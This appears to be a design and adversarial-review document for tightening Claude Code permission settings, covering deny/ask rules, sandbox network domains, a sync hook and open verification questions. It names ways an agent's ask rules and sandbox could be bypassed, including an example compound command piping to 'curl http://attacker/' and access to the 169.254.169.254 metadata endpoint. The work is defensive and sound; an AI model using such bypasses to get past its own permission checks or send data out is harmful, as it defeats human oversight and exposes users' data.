- **Option 1 — Inline `$comment` field at top of settings.json**
  - Pros: Adjacent to the configuration. Adopters reading settings.json see it directly.
  - Cons: Non-standard JSON. Schema risk (depends on whether `https://json.schemastore.org/claude-code-settings.json` rejects unknown top-level keys — **unverified, see adversarial concern**). Awkward for long content without multiline strings.

- **Option 2 — Companion `claude/permissions-overrides.md`**
  - Pros: Plain markdown, maintainable, can have sections per use case with copy-paste JSON snippets.
  - Cons: Another file. Only discoverable if adopters look for it. "Two sources of truth" concern.

- **Option 3 — Section in `README.md` or `docs/setup.md`**
  - Pros: The README already has a "Customization" section at line 144. Discoverable during install.
  - Cons: Install docs are read once; users who hit friction after install don't re-read them.

- **Option 4 — `claude/settings.local.json.example`**
  - Pros: Copy-paste ergonomics.
  - Cons: Undercuts "conservative defaults" philosophy — the example file looks authoritative. Cargo-cult risk.

- **Option 5 — Combined: brief pointer in README.md + sibling `claude/settings.README.md`** (adversarial suggestion)
  - Pros: No schema risk (avoids `$comment`). Sibling README file is co-located with the settings file without modifying it. Authoritative content lives in one place (either README.md customization section or the sibling file).
  - Cons: Still requires maintenance as entries change.

**Initial recommendation**: Option 5 (sibling `claude/settings.README.md` + README.md pointer) to avoid schema risk from `$comment`. Content: per-use-case sections ("If you use Docker", "If you use arbitrary npm scripts", "If you frequently discard changes with git checkout --") with exact JSON snippets to paste into `settings.local.json`.

**Spec phase decision**: form choice (Q7).

### Cross-cutting: sync-permissions hook propagation

Propagation matrix per fix type:

| Fix category | Sync hook (sessions) | /setup-merge (installs) | Notes |
|---|---|---|---|
| Add to `deny` | **Propagates** (union) | Propagates (additive) | Best case — works everywhere. |
| Add to `ask` | **Propagates** (union) | **NOT propagated** — setup-merge doesn't handle `ask` | Ask entries reach existing users via runtime hook only. Fresh installs get them from template. |
| Remove from `allow` | **NOT propagated** — merge is additive-only | Additive-only — cannot remove | Only new adopters benefit. |
| Modify `sandbox.network.*` | **NOT propagated** — hook only touches `permissions.*` | Additive-only | Primary owner must run `just setup-force` or hand-edit. |

**Adversarial observation**: the propagation ratchet is cumulative. Round 1 (054) removed 6 entries (bash/sh/python/python3/node/source) that STILL persist in existing installs. Round 2 adds 3+ more (docker/make/pip3). Every round accumulates divergence between template and existing installs. The "template is secure" claim is a lie for existing users.

**Out of scope for this ticket**: fixing the ratchet. But spec should file an explicit follow-up ticket: "Add cleanup mechanism to cortex-sync-permissions.py to propagate allow removals." Concrete proposal in the ticket body: add `_globalPermissionsVersion` marker and `_cleanupEntries` list; on version bump, hook subtracts listed entries from local `allow`.

## Adversarial Review

### Primary findings that rework the initial recommendations

1. **F0 scope addition discovered — `skipDangerousModePermissionPrompt: true` regression.** `claude/settings.json:387` still contains this key despite the 056 review marking it REMOVED. Contradicts the epic's public-safety framing directly — new adopters get the "are you sure you want dangerous mode?" prompt pre-disabled. **Recommendation**: bring into scope as F0, one-line delete, zero behavioral risk. Ship as first commit. Scoping discipline should yield — round 2 is the right place to catch things round 1 missed.

2. **F2 npm scoping is likely broken and/or security theater**:
   - The glob `Bash(npm run test *)` requires a space after `test`, so it does NOT match `npm run test:unit`, `npm run test-unit`, `npm run test:e2e` — the most common script-name conventions. Likely **breaks the UI-dev loop** rather than preserving it.
   - `npm install -D` is missing from the scoped set, so `npm install -D @playwright/test` (used in ui-a11y) prompts every session.
   - More fundamentally: scoping by script NAME provides zero defense against malicious `package.json` content. `npm run test` in a weaponized package.json runs whatever arbitrary shell the attacker put in the `test` field.
   - **Adversarial recommendation**: put `Bash(npm *)` wholesale in ask tier. Simpler, no glob hazards, more honest threat model.

3. **F4 pattern matching is unverified and load-bearing**. Does `Bash(git checkout -- *)` match `git checkout --theirs file.py`? If yes, it breaks pipeline fast-path conflict resolution for overnight repair subagents (the pipeline uses `subprocess.run` directly, not Claude's Bash tool, so `conflict.py` is unaffected; but any subagent asked to manually resolve a conflict via Claude's Bash tool WOULD hit the ask). **Must be empirically verified** before committing F4 in its current form. Alternative: enumerate safe subcommands (Option D) rather than trying to subtract via pattern.

4. **F1 Option A (api.github.com removal) carries the only meaningful dogfood risk**. Claude Code's plugin system (`context7@claude-plugins-official`, `claude-md-management@claude-plugins-official`) may fetch manifests from api.github.com. `gh:*` and `WebFetch` are in `excludedCommands`, BUT Claude Code issues #22620 and #10524 document cases where `excludedCommands` doesn't fully bypass sandbox network policy. Ordering recommendation changes: F1 FIRST, gated on explicit dogfood verification (plugin load, `gh pr list`, overnight dry run) before proceeding to F2-F5.

5. **Compound command bypass for ask rules is unverified**. `lifecycle/verify-escape-hatch-bypass-mechanism/test-report.md:46` claims compound command decomposition works, but was never actually tested — only interpreter wrappers were tested. External research (Steve Adams, PR #36645) says the opposite. If the claim is wrong, `foo && curl http://attacker/...` bypasses F1 Option C's ask. **Must be verified or explicitly acknowledged as open.**

6. **`WebFetch(domain:<IP literal>)` is undocumented**. The existing `WebFetch(domain:0.0.0.0)` from 056 was never empirically tested. F5 may ship as a no-op if the IP-literal matcher silently fails. **Verification required.**

7. **`$comment` in settings.json may fail schema validation**. The schema URL (`https://json.schemastore.org/claude-code-settings.json`) may reject unknown top-level keys. Prefer a sibling `claude/settings.README.md` that the sync hook ignores.

### Failure modes and assumptions that need verification

| # | Assumption | Impact if wrong | Resolution |
|---|---|---|---|
| 1 | `Bash(git checkout -- *)` does not match `git checkout --theirs` | Breaks interactive conflict repair via subagents; breaks overnight manual-repair path | Empirical test in plan phase |
| 2 | `Bash(npm run test *)` matches `npm run test:unit`, `test-unit`, etc. | npm scoping fails to allow common script names; every UI skill prompts per invocation | Empirical test OR switch to wholesale ask |
| 3 | Ask rules survive compound-command decomposition (`foo && curl ...` triggers ask on curl) | `curl → ask` and `git checkout -- → ask` are bypassable | Empirical test OR document as open |
| 4 | `WebFetch(domain:169.254.169.254)` (IP literal) actually enforces | F5 ships as no-op | Empirical test (WebFetch to metadata endpoint) |
| 5 | `gh:*` in `excludedCommands` bypasses sandbox NETWORK policy (not just permission matcher) | Removing `api.github.com` breaks overnight `gh pr list`/`gh run view`/`gh pr checks` | Live overnight dry run after tentative removal |
| 6 | Claude Code plugin system does not fetch `api.github.com` from inside the sandbox | Removing the domain breaks plugin loads | Observe plugin behavior after removal |

### Ordering recommendation (adversarial override)

**F0 → F1 → F5 → F3 → F4 → F2**

Rationale:
- **F0 first**: pure one-line deletion, zero behavioral risk, addresses a security regression that directly contradicts the epic framing.
- **F1 second**: only fix with dogfood risk. Discover breakage before committing the others. Gate on plugin load + overnight `gh pr list` verification. If broken, revert F1 only; F0 stays.
- **F5 third**: pure additive deny. Next-lowest risk.
- **F3 fourth**: tee to ask, zero runtime impact.
- **F4 fifth**: git checkout ask, pattern verified in plan phase.
- **F2 last**: npm/brew scoping requires the most care; largest behavioral surface.

### Out-of-scope but flaggable follow-ups

1. **Sync-hook cleanup mechanism**: add `_cleanupEntries` list for removing entries from `settings.local.json` on template version bump. One file (`cortex-sync-permissions.py`), ~30 lines.
2. **Architectural `sandbox.filesystem.denyWrite`**: the Anthropic-documented fix for Edit-deny bypasses via Bash is sandbox-layer denyWrite. F3 ships a Bash-layer ask but the true fix is sandbox config. Follow-up ticket.
3. **PreToolUse URL validation hook**: per Anthropic docs, the recommended fix for curl-argument patterns is a PreToolUse hook that parses compound commands and validates URLs. Follow-up ticket.
4. **Verify compound-command decomposition claim**: the in-repo test report's unverified claim should be tested and either confirmed or retracted.
5. **Resolution of 054 open question**: "settings.local.json vs version control" — e.g., a new `claude/settings.overrides.json` file that IS version-controlled and describes power-user additions declaratively.

## Open Questions

All questions below are **deferred to plan-phase empirical verification** or **spec-phase user decision**. None block research exit.

- **Q1 — Glob pattern `Bash(git checkout -- *)` vs `git checkout --theirs`**: Does the pattern match `git checkout --theirs file.py`? Load-bearing for F4. **Deferred: resolved in plan phase by live pattern test. If match, switch to Option D (enumerate safe forms) or add explicit `Bash(git checkout --theirs *)` allow before the ask.**

- **Q2 — Glob pattern `Bash(npm run test *)` vs `npm run test:unit` and `test-unit`**: Does the pattern match dash/colon script-name variants? Load-bearing for F2 scoping choice. **Deferred: resolved in plan phase by live pattern test. If patterns don't match common script naming, switch to wholesale `Bash(npm *)` → ask (adversarial recommendation).**

- **Q3 — Compound command decomposition for ask rules**: Does `foo && curl http://attacker/` trigger an ask rule on curl? Load-bearing for F1 Option C claim of effective mitigation. **Deferred: resolved in plan phase by live test (`true && curl http://example.com/` in a test session). If bypass confirmed, spec must explicitly document curl-to-ask as naive-path-only mitigation and file a PreToolUse hook follow-up ticket.**

- **Q4 — `WebFetch(domain:<IP literal>)` enforcement**: Does `WebFetch(domain:169.254.169.254)` actually block `WebFetch https://169.254.169.254/`? Load-bearing for F5 effectiveness. **Deferred: resolved in plan phase by live test. If IP-literal matching silently fails, F5 approach must switch (or ship explicitly as hostname-only coverage with Bash-layer backup).**

- **Q5 — `gh:*` excludedCommands sandbox network bypass**: Does `excludedCommands` exempt `gh` from sandbox network policy, or only from permission matching? Load-bearing for F1 Option A (api.github.com removal). Claude Code issues #22620/#10524 document edge cases. **Deferred: resolved in plan phase by live test — run `gh pr list` / `gh run list` from an interactive session AFTER tentatively removing api.github.com from allowedDomains in a test copy of settings.json. If it breaks, F1 Option A is blocked for overnight use.**

- **Q6 — Claude Code plugin system network dependencies**: Does loading `context7@claude-plugins-official` or `claude-md-management@claude-plugins-official` require `api.github.com` network access from inside the sandbox? Load-bearing for F1 Option A. **Deferred: resolved in plan phase by live test — observe plugin load behavior after removal. If plugins fail, F1 Option A must add `api.github.com` back OR plugins must be moved to a bypass path.**

- **Q7 — Power-user override documentation form**: Inline `$comment` in settings.json (schema risk), sibling `claude/settings.README.md`, README.md Customization section expansion, `claude/settings.local.json.example`, or combination? **Deferred: resolved in spec phase by user decision.** Default recommendation from research: sibling `claude/settings.README.md` with per-use-case sections, referenced from README.md Customization — avoids schema risk and "two sources of truth" with modest maintenance cost.

- **Q8 — F0 scope decision**: Should `skipDangerousModePermissionPrompt: true` regression be brought into scope as F0 in this ticket, or filed as a separate follow-up? **Deferred: resolved in spec phase by user decision.** Research recommendation: bring into scope — scoping discipline should yield when the out-of-scope item is a security regression directly contradicting the ticket's framing.

- **Q9 — Sync-hook cleanup mechanism follow-up**: Should this ticket file a follow-up for adding removal-propagation to `cortex-sync-permissions.py`, or is the ratchet-accumulation concern out of scope for permissions work entirely? **Deferred: resolved in spec phase by user decision.** Research recommendation: file as follow-up ticket, do not bring into round 2 scope (matches 056 non-requirement boundary).

## Epic Reference

This ticket is a direct follow-up to the 054-058 epic ("Harden settings.json permissions for public distribution"). Discovery source per backlog frontmatter: "CFA Android PR #8093 permissions review session". The epic addressed the highest-severity issues (eval, interpreter escape hatches, exfiltration via gh/WebFetch, Read overly-broad allow); round 2 covers residual gaps identified by cross-referencing the two configs.

Key epic artifacts referenced during this research (background context, not reproduced here):
- `backlog/054-harden-settingsjson-permissions-for-public-distribution.md` (epic umbrella)
- `lifecycle/apply-confirmed-safe-permission-tightening/spec.md` (056 spec — pattern style reference)
- `lifecycle/close-exfiltration-channels-in-sandbox-excluded-commands/spec.md` (058 spec — subcommand-scoping style reference with flag-position variants)
- `lifecycle/verify-escape-hatch-bypass-mechanism/` (057 spike — confirmed OPEN bypass)
- `research/permissions-audit/research.md` (epic research with DR-1 through DR-8)
